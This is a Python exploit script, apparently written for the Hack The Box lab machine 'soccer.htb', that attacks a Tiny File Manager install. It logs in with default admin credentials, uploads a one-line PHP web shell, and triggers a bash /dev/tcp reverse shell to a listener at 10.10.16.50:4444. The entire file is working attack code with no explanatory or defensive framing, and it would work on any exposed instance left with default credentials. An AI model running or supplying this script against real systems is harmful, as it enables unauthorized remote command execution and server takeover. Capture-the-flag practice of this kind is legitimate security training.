import requests

BASEURL = "http://soccer.htb/tiny/"
PHP_WEBSHELL = "<?php system($_REQUEST['cmd']); ?>"


def status(txt: str, prefix=""):
    print(prefix + f"[*] {txt}")


# Login
post_data = {
    "fm_usr": "admin",
    "fm_pwd": "admin@123",
}
session = requests.Session()
resp = session.post(url=BASEURL, data=post_data, allow_redirects=True)
assert resp.status_code == 200, f"Login not successful:{resp.status_code}"
status(f"Logged in successfully")


# Upload shell
form_data = {
    "p": 'tiny/uploads',
    "fullpath": "shell.php",
}
files = [
    ('file', ("shell.php", PHP_WEBSHELL))
]
resp = session.post(url=BASEURL + "tinyfilemanager.php", data=form_data, files=files)
assert resp.status_code == 200
assert resp.json()["status"] == "success"
shell_path = BASEURL + "uploads/shell.php"
status(f"Uploaded PHP file to {shell_path}")


# Trigger reverse shell
ip = "10.10.16.50"
port = "4444"
cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
status(f"Try to send a reverse shell to {ip}:{port}. Check your listener...")
session.get(shell_path, params={"cmd": cmd})
assert resp.status_code == 200




